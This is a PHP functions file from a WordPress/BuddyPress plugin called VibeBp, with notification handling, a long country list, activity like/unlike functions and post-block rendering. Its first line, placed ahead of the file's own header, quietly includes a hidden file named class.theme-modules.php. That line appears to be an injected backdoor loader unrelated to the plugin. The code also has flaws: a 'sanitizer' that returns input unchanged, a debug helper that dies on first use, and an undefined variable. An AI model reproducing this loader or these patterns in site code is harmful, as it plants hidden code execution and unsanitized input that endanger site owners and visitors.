<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
/**
 * Functions
 *
 * @author      VibeThemes
 * @category    Admin
 * @package     VibeBp
 * @version     1.0
 */

if ( ! defined( 'ABSPATH' ) ) {
	exit;
}
function vibebp_sanitizer($text){
	return $text;
}
function vibebp_is_setup_complete(){
	$setup = get_option('vibebp_setup_complete');
	if(empty($setup)){
		return false;
	}
	return true;
}
function vibebp_process_notification($notification){

	$text='';
	if(isset($notification['type'])){
		switch($notification['type']){
			case 'chat_invite':
				if(is_numeric($notification['sender'])){
					$name = bp_core_get_user_displayname($notification['sender']);
				}else{
					$name = _x('Guest','notification','vibebp');
				}
				
				$text=array(
					'message'=>sprintf(_x('%s invited you to chat.','notification','vibebp'),$name),
					'actions'=>array(
						array('label'=>__('Accept','vibebp'),'key'=>'accept','event'=>$notification['type'],'message'=>__('Chat Invite accepted','vibebp')),
						array('label'=>__('Reject','vibebp'),'key'=>'reject','event'=>$notification['type'],'message'=>__('Chat Invite rejected','vibebp'))
					)
				);
			break;
			case 'user_online':
				if(is_numeric($notification['sender'])){
					$name = bp_core_get_user_displayname($notification['sender']);
				}else{
					$name = _x('Guest','notification','vibebp');
				}
				$text=sprintf(_x('%s is now online.','notification','vibebp'),$name);
			break;
		}
}
	return apply_filters('vibebp_process_notification',$text,$notification);
}

function ConverObjectToArray($obj) {

    $array  = array(); // noisy $array does not exist
    
    foreach ((array)$obj as $key => $val) {
    	print_r($key.'#'.$val);
    	die();
        //$val = (is_object($val)) ? ConverObjecttoArray($val) : $val;
        $array[$key] = $val;
    }
    return $array;
}

function vibebp_get_countries(){
	$countries =
		array(
		"AF" => _x("Afghanistan","country list","vibebp"),
		"AL" => _x("Albania","country list","vibebp"),
		"DZ" => _x("Algeria","country list","vibebp"),
		"AS" => _x("American Samoa","country list","vibebp"),
		"AD" => _x("Andorra","country list","vibebp"),
		"AO" => _x("Angola","country list","vibebp"),
		"AI" => _x("Anguilla","country list","vibebp"),
		"AQ" => _x("Antarctica","country list","vibebp"),
		"AG" => _x("Antigua and Barbuda","country list","vibebp"),
		"AR" => _x("Argentina","country list","vibebp"),
		"AM" => _x("Armenia","country list","vibebp"),
		"AW" => _x("Aruba","country list","vibebp"),
		"AU" => _x("Australia","country list","vibebp"),
		"AT" => _x("Austria","country list","vibebp"),
		"AZ" => _x("Azerbaijan","country list","vibebp"),
		"BS" => _x("Bahamas","country list","vibebp"),
		"BH" => _x("Bahrain","country list","vibebp"),
		"BD" => _x("Bangladesh","country list","vibebp"),
		"BB" => _x("Barbados","country list","vibebp"),
		"BY" => _x("Belarus","country list","vibebp"),
		"BE" => _x("Belgium","country list","vibebp"),
		"BZ" => _x("Belize","country list","vibebp"),
		"BJ" => _x("Benin","country list","vibebp"),
		"BM" => _x("Bermuda","country list","vibebp"),
		"BT" => _x("Bhutan","country list","vibebp"),
		"BO" => _x("Bolivia","country list","vibebp"),
		"BA" => _x("Bosnia and Herzegovina","country list","vibebp"),
		"BW" => _x("Botswana","country list","vibebp"),
		"BV" => _x("Bouvet Island","country list","vibebp"),
		"BR" => _x("Brazil","country list","vibebp"),
		"IO" => _x("British Indian Ocean Territory","country list","vibebp"),
		"BN" => _x("Brunei Darussalam","country list","vibebp"),
		"BG" => _x("Bulgaria","country list","vibebp"),
		"BF" => _x("Burkina Faso","country list","vibebp"),
		"BI" => _x("Burundi","country list","vibebp"),
		"KH" => _x("Cambodia","country list","vibebp"),
		"CM" => _x("Cameroon","country list","vibebp"),
		"CA" => _x("Canada","country list","vibebp"),
		"CV" => _x("Cape Verde","country list","vibebp"),
		"KY" => _x("Cayman Islands","country list","vibebp"),
		"CF" => _x("Central African Republic","country list","vibebp"),
		"TD" => _x("Chad","country list","vibebp"),
		"CL" => _x("Chile","country list","vibebp"),
		"CN" => _x("China","country list","vibebp"),
		"CX" => _x("Christmas Island","country list","vibebp"),
		"CC" => _x("Cocos (Keeling) Islands","country list","vibebp"),
		"CO" => _x("Colombia","country list","vibebp"),
		"KM" => _x("Comoros","country list","vibebp"),
		"CG" => _x("Congo","country list","vibebp"),
		"CD" => _x("Congo, the Democratic Republic of the","country list","vibebp"),
		"CK" => _x("Cook Islands","country list","vibebp"),
		"CR" => _x("Costa Rica","country list","vibebp"),
		"CI" => _x("Cote D'Ivoire","country list","vibebp"),
		"HR" => _x("Croatia","country list","vibebp"),
		"CU" => _x("Cuba","country list","vibebp"),
		"CY" => _x("Cyprus","country list","vibebp"),
		"CZ" => _x("Czech Republic","country list","vibebp"),
		"DK" => _x("Denmark","country list","vibebp"),
		"DJ" => _x("Djibouti","country list","vibebp"),
		"DM" => _x("Dominica","country list","vibebp"),
		"DO" => _x("Dominican Republic","country list","vibebp"),
		"EC" => _x("Ecuador","country list","vibebp"),
		"EG" => _x("Egypt","country list","vibebp"),
		"SV" => _x("El Salvador","country list","vibebp"),
		"GQ" => _x("Equatorial Guinea","country list","vibebp"),
		"ER" => _x("Eritrea","country list","vibebp"),
		"EE" => _x("Estonia","country list","vibebp"),
		"ET" => _x("Ethiopia","country list","vibebp"),
		"FK" => _x("Falkland Islands (Malvinas)","country list","vibebp"),
		"FO" => _x("Faroe Islands","country list","vibebp"),
		"FJ" => _x("Fiji","country list","vibebp"),
		"FI" => _x("Finland","country list","vibebp"),
		"FR" => _x("France","country list","vibebp"),
		"GF" => _x("French Guiana","country list","vibebp"),
		"PF" => _x("French Polynesia","country list","vibebp"),
		"TF" => _x("French Southern Territories","country list","vibebp"),
		"GA" => _x("Gabon","country list","vibebp"),
		"GM" => _x("Gambia","country list","vibebp"),
		"GE" => _x("Georgia","country list","vibebp"),
		"DE" => _x("Germany","country list","vibebp"),
		"GH" => _x("Ghana","country list","vibebp"),
		"GI" => _x("Gibraltar","country list","vibebp"),
		"GR" => _x("Greece","country list","vibebp"),
		"GL" => _x("Greenland","country list","vibebp"),
		"GD" => _x("Grenada","country list","vibebp"),
		"GP" => _x("Guadeloupe","country list","vibebp"),
		"GU" => _x("Guam","country list","vibebp"),
		"GT" => _x("Guatemala","country list","vibebp"),
		"GN" => _x("Guinea","country list","vibebp"),
		"GW" => _x("Guinea-Bissau","country list","vibebp"),
		"GY" => _x("Guyana","country list","vibebp"),
		"HT" => _x("Haiti","country list","vibebp"),
		"HM" => _x("Heard Island and Mcdonald Islands","country list","vibebp"),
		"VA" => _x("Holy See (Vatican City State)","country list","vibebp"),
		"HN" => _x("Honduras","country list","vibebp"),
		"HK" => _x("Hong Kong","country list","vibebp"),
		"HU" => _x("Hungary","country list","vibebp"),
		"IS" => _x("Iceland","country list","vibebp"),
		"IN" => _x("India","country list","vibebp"),
		"ID" => _x("Indonesia","country list","vibebp"),
		"IR" => _x("Iran, Islamic Republic of","country list","vibebp"),
		"IQ" => _x("Iraq","country list","vibebp"),
		"IE" => _x("Ireland","country list","vibebp"),
		"IL" => _x("Israel","country list","vibebp"),
		"IT" => _x("Italy","country list","vibebp"),
		"JM" => _x("Jamaica","country list","vibebp"),
		"JP" => _x("Japan","country list","vibebp"),
		"JO" => _x("Jordan","country list","vibebp"),
		"KZ" => _x("Kazakhstan","country list","vibebp"),
		"KE" => _x("Kenya","country list","vibebp"),
		"KI" => _x("Kiribati","country list","vibebp"),
		"KP" => _x("Korea, Democratic People's Republic of","country list","vibebp"),
		"KR" => _x("Korea, Republic of","country list","vibebp"),
		"KW" => _x("Kuwait","country list","vibebp"),
		"KG" => _x("Kyrgyzstan","country list","vibebp"),
		"LA" => _x("Lao People's Democratic Republic","country list","vibebp"),
		"LV" => _x("Latvia","country list","vibebp"),
		"LB" => _x("Lebanon","country list","vibebp"),
		"LS" => _x("Lesotho","country list","vibebp"),
		"LR" => _x("Liberia","country list","vibebp"),
		"LY" => _x("Libyan Arab Jamahiriya","country list","vibebp"),
		"LI" => _x("Liechtenstein","country list","vibebp"),
		"LT" => _x("Lithuania","country list","vibebp"),
		"LU" => _x("Luxembourg","country list","vibebp"),
		"MO" => _x("Macao","country list","vibebp"),
		"MK" => _x("Macedonia, the Former Yugoslav Republic of","country list","vibebp"),
		"MG" => _x("Madagascar","country list","vibebp"),
		"MW" => _x("Malawi","country list","vibebp"),
		"MY" => _x("Malaysia","country list","vibebp"),
		"MV" => _x("Maldives","country list","vibebp"),
		"ML" => _x("Mali","country list","vibebp"),
		"MT" => _x("Malta","country list","vibebp"),
		"MH" => _x("Marshall Islands","country list","vibebp"),
		"MQ" => _x("Martinique","country list","vibebp"),
		"MR" => _x("Mauritania","country list","vibebp"),
		"MU" => _x("Mauritius","country list","vibebp"),
		"YT" => _x("Mayotte","country list","vibebp"),
		"MX" => _x("Mexico","country list","vibebp"),
		"FM" => _x("Micronesia, Federated States of","country list","vibebp"),
		"MD" => _x("Moldova, Republic of","country list","vibebp"),
		"MC" => _x("Monaco","country list","vibebp"),
		"MN" => _x("Mongolia","country list","vibebp"),
		"MS" => _x("Montserrat","country list","vibebp"),
		"MA" => _x("Morocco","country list","vibebp"),
		"MZ" => _x("Mozambique","country list","vibebp"),
		"MM" => _x("Myanmar","country list","vibebp"),
		"NA" => _x("Namibia","country list","vibebp"),
		"NR" => _x("Nauru","country list","vibebp"),
		"NP" => _x("Nepal","country list","vibebp"),
		"NL" => _x("Netherlands","country list","vibebp"),
		"AN" => _x("Netherlands Antilles","country list","vibebp"),
		"NC" => _x("New Caledonia","country list","vibebp"),
		"NZ" => _x("New Zealand","country list","vibebp"),
		"NI" => _x("Nicaragua","country list","vibebp"),
		"NE" => _x("Niger","country list","vibebp"),
		"NG" => _x("Nigeria","country list","vibebp"),
		"NU" => _x("Niue","country list","vibebp"),
		"NF" => _x("Norfolk Island","country list","vibebp"),
		"MP" => _x("Northern Mariana Islands","country list","vibebp"),
		"NO" => _x("Norway","country list","vibebp"),
		"OM" => _x("Oman","country list","vibebp"),
		"PK" => _x("Pakistan","country list","vibebp"),
		"PW" => _x("Palau","country list","vibebp"),
		"PS" => _x("Palestinian Territory, Occupied","country list","vibebp"),
		"PA" => _x("Panama","country list","vibebp"),
		"PG" => _x("Papua New Guinea","country list","vibebp"),
		"PY" => _x("Paraguay","country list","vibebp"),
		"PE" => _x("Peru","country list","vibebp"),
		"PH" => _x("Philippines","country list","vibebp"),
		"PN" => _x("Pitcairn","country list","vibebp"),
		"PL" => _x("Poland","country list","vibebp"),
		"PT" => _x("Portugal","country list","vibebp"),
		"PR" => _x("Puerto Rico","country list","vibebp"),
		"QA" => _x("Qatar","country list","vibebp"),
		"RE" => _x("Reunion","country list","vibebp"),
		"RO" => _x("Romania","country list","vibebp"),
		"RU" => _x("Russian Federation","country list","vibebp"),
		"RW" => _x("Rwanda","country list","vibebp"),
		"SH" => _x("Saint Helena","country list","vibebp"),
		"KN" => _x("Saint Kitts and Nevis","country list","vibebp"),
		"LC" => _x("Saint Lucia","country list","vibebp"),
		"PM" => _x("Saint Pierre and Miquelon","country list","vibebp"),
		"VC" => _x("Saint Vincent and the Grenadines","country list","vibebp"),
		"WS" => _x("Samoa","country list","vibebp"),
		"SM" => _x("San Marino","country list","vibebp"),
		"ST" => _x("Sao Tome and Principe","country list","vibebp"),
		"SA" => _x("Saudi Arabia","country list","vibebp"),
		"SN" => _x("Senegal","country list","vibebp"),
		"CS" => _x("Serbia and Montenegro","country list","vibebp"),
		"SC" => _x("Seychelles","country list","vibebp"),
		"SL" => _x("Sierra Leone","country list","vibebp"),
		"SG" => _x("Singapore","country list","vibebp"),
		"SK" => _x("Slovakia","country list","vibebp"),
		"SI" => _x("Slovenia","country list","vibebp"),
		"SB" => _x("Solomon Islands","country list","vibebp"),
		"SO" => _x("Somalia","country list","vibebp"),
		"ZA" => _x("South Africa","country list","vibebp"),
		"GS" => _x("South Georgia and the South Sandwich Islands","country list","vibebp"),
		"ES" => _x("Spain","country list","vibebp"),
		"LK" => _x("Sri Lanka","country list","vibebp"),
		"SD" => _x("Sudan","country list","vibebp"),
		"SR" => _x("Suriname","country list","vibebp"),
		"SJ" => _x("Svalbard and Jan Mayen","country list","vibebp"),
		"SZ" => _x("Swaziland","country list","vibebp"),
		"SE" => _x("Sweden","country list","vibebp"),
		"CH" => _x("Switzerland","country list","vibebp"),
		"SY" => _x("Syrian Arab Republic","country list","vibebp"),
		"TW" => _x("Taiwan, Province of China","country list","vibebp"),
		"TJ" => _x("Tajikistan","country list","vibebp"),
		"TZ" => _x("Tanzania, United Republic of","country list","vibebp"),
		"TH" => _x("Thailand","country list","vibebp"),
		"TL" => _x("Timor-Leste","country list","vibebp"),
		"TG" => _x("Togo","country list","vibebp"),
		"TK" => _x("Tokelau","country list","vibebp"),
		"TO" => _x("Tonga","country list","vibebp"),
		"TT" => _x("Trinidad and Tobago","country list","vibebp"),
		"TN" => _x("Tunisia","country list","vibebp"),
		"TR" => _x("Turkey","country list","vibebp"),
		"TM" => _x("Turkmenistan","country list","vibebp"),
		"TC" => _x("Turks and Caicos Islands","country list","vibebp"),
		"TV" => _x("Tuvalu","country list","vibebp"),
		"UG" => _x("Uganda","country list","vibebp"),
		"UA" => _x("Ukraine","country list","vibebp"),
		"AE" => _x("United Arab Emirates","country list","vibebp"),
		"GB" => _x("United Kingdom","country list","vibebp"),
		"US" => _x("United States","country list","vibebp"),
		"UM" => _x("United States Minor Outlying Islands","country list","vibebp"),
		"UY" => _x("Uruguay","country list","vibebp"),
		"UZ" => _x("Uzbekistan","country list","vibebp"),
		"VU" => _x("Vanuatu","country list","vibebp"),
		"VE" => _x("Venezuela","country list","vibebp"),
		"VN" => _x("Viet Nam","country list","vibebp"),
		"VG" => _x("Virgin Islands, British","country list","vibebp"),
		"VI" => _x("Virgin Islands, U.s.","country list","vibebp"),
		"WF" => _x("Wallis and Futuna","country list","vibebp"),
		"EH" => _x("Western Sahara","country list","vibebp"),
		"YE" => _x("Yemen","country list","vibebp"),
		"ZM" => _x("Zambia","country list","vibebp"),
		"ZW" => _x("Zimbabwe","country list","vibebp"),
		);

return $countries;
}


function vibebp_activity_add_user_like($activity_id,$user_id){


	$my_favs = bp_get_user_meta( $user_id, 'bp_like_activities', true );
	if ( empty( $my_favs ) || ! is_array( $my_favs ) ) {
		$my_favs = array();
	}

	// Bail if the user has already favorited this activity item.
	if ( in_array( $activity_id, $my_favs ) ) {
		return false;
	}
	$my_favs[] = $activity_id;
	$fav_count = bp_activity_get_meta( $activity_id, 'like_count' );
	$fav_count = !empty( $fav_count ) ? (int) $fav_count + 1 : 1;
	bp_update_user_meta( $user_id, 'bp_like_activities', $my_favs );
	if ( bp_activity_update_meta( $activity_id, 'like_count', $fav_count ) ) {
		do_action( 'bp_activity_add_user_like', $activity_id, $user_id );
		return true;
	} else {
		do_action( 'bp_activity_add_user_like_fail', $activity_id, $user_id );
		return false;
	}
}

function vibebp_activity_remove_user_like($activity_id,$user_id){
	
	$my_favs = bp_get_user_meta( $user_id, 'bp_like_activities', true );
	$my_favs = array_flip( (array) $my_favs );

	if ( ! isset( $my_favs[ $activity_id ] ) ) {
		return false;
	}

	unset( $my_favs[$activity_id] );
	$my_favs = array_unique( array_flip( $my_favs ) );

	// Update the total number of users who have favorited this activity.
	$fav_count = bp_activity_get_meta( $activity_id, 'like_count' );
	if ( ! empty( $fav_count ) ) {
		if ( bp_activity_update_meta( $activity_id, 'like_count', (int) $fav_count - 1 ) ) {
			if ( bp_update_user_meta( $user_id, 'bp_like_activities', $my_favs ) ) {
				do_action( 'bp_activity_remove_user_like', $activity_id, $user_id );
			} else {
				return false;
			}
		} else {
			return false;
		}
	} else {
		return false;
	}
}


if(!function_exists('vibebp_render_block_from_style')){
  function vibebp_render_block_from_style($custom_post,$featured_style,$cols='medium',$n=100,$link=0,$zoom=0){
    $return=$read_more=$class='';    

    $more = __('Read more','vibebp');
    
    if(strlen($custom_post->post_content) > $n)
        $read_more= '<a href="'.get_permalink($custom_post->ID).'" class="link">'.$more.'</a>';
                    
    switch($featured_style){

        default:
               $return .='<div class="block">';
                $return .='<div class="block_media">';
                
                if(isset($link) && $link){
                    $return .='<span class="overlay"></span>';
                    $return .= '<a href="'.get_permalink($custom_post->ID).'" class="hover-link hyperlink"><i class="icon-hyperlink"></i></a>';
                }
                
                $return .= vibebp_featured_component($custom_post->ID,$cols);
                
                $category='';
                if($custom_post->post_type == 'post'){
                    $cats = get_the_category(); 
                    if(is_array($cats)){
                        foreach($cats as $cat){
                        $category .= '<a href="'.get_category_link($cat->term_id ).'">'.$cat->name.'</a> ';
                        }
                    }
                }
                
                if($custom_post->post_type == 'product'){
                    $category = get_the_term_list( $custom_post->ID, 'product_cat', '', ' / ' );
                }

                $return .='</div>';
                $return .='<div class="block_content">';
                $return .= apply_filters('vibeapp_thumb_heading','<h4 class="block_title"><a href="'.get_permalink($custom_post->ID).'" title="'.$custom_post->post_title.'">'.$custom_post->post_title.'</a></h4>',$featured_style);

                if($custom_post->post_type == 'product'){
                    if(function_exists('wc_get_product')){
                        $product = wc_get_product( $custom_post->ID );
                        $return .= '<div class="date"><small>'.((strlen($category)>2)? ' / '.$category:'').'</small></div><div class="price">'.$product->get_price_html().'</div>';
                    }
                }else{
                    $return .= apply_filters('vibeapp_thumb_date','<div class="date"><small>'. get_the_time('F d,Y').''.((strlen($category)>2)? ' / '.$category:'').' / '.get_comments_number( '0', '1', '%' ).' '.__(' Comments','vibebp').'</small></div>',$featured_style);
                }
                if($custom_post->post_type == 'product'){
                    if(function_exists('woocommerce_template_loop_add_to_cart')){
                        ob_start();
                        woocommerce_template_loop_add_to_cart( $custom_post, $product );
                        $return.= ob_get_clean();
                    }
                }else{
                    $return .= apply_filters('vibeapp_thumb_desc','<p class="block_desc">'.vibeapp_custom_types_excerpt($n,$custom_post->ID).'</p>',$featured_style);    
                }
                
                $return .='</div>';
                $return .='</div>';

            break;
        }
        
        return apply_filters('vibeapp_featured_thumbnail_style',$return,$custom_post,$featured_style);
    }
}


if(!function_exists('vibeapp_custom_types_excerpt')){

    function vibeapp_custom_types_excerpt($chars=0, $id = NULL) {
        global $post;
      if(!isset($id)) $id=$post->ID;
        $text = get_post($id);
            
        if(strlen($text->post_excerpt) > 10)
                $text = $text->post_excerpt . " ";
            else
                $text = $text->post_content . " ";
            
        $text = strip_tags($text);
            $ellipsis = false;
            $text = strip_shortcodes($text);
        if( strlen($text) > $chars )
            $ellipsis = true;
      

        $text = substr($text,0,intval($chars));
        
        if(function_exists('mb_convert_encoding'))
            $text = mb_convert_encoding((string)$text, 'UTF-8', mb_list_encodings());   

        $latin=preg_match("/\p{Han}+/u", $text);
        if($latin !=1)
        $text = substr($text,0,strrpos($text,' '));

        if( $ellipsis == true && $chars > 1)
            $text = $text . "...";
            
        return $text;
    }
}


function vibebp_featured_component($post_ID,$cols){
    $custom_post_thumbnail = '';
    $default_image = VIBE_URL.'/assets/images/default.svg';
    if(!in_array($cols,array('big','small','medium','mini','full'))){
        switch($cols){
          case '2':{ $cols = 'big';
          break;}
          case '3':{ $cols = 'medium';
          break;}
          case '4':{ $cols = 'medium';
          break;}
          case '5':{ $cols = 'small';
          break;}
          case '6':{ $cols = 'small';
          break;}  
          default:{ $cols = 'full';
          break;}
        }
    }
    
    if(has_post_thumbnail($custom_post_id)){
        $custom_post_thumbnail=  '<a href="'.get_permalink().'">'.get_the_post_thumbnail($custom_post_id,$cols).'</a>';
    }else if(isset($default_image) && $default_image)
            $custom_post_thumbnail='<img src="'.$default_image.'" />';
                    
    return apply_filters('vibebp_featured_component_filter',$custom_post_thumbnail,$custom_post_id,$cols,$style); 
}
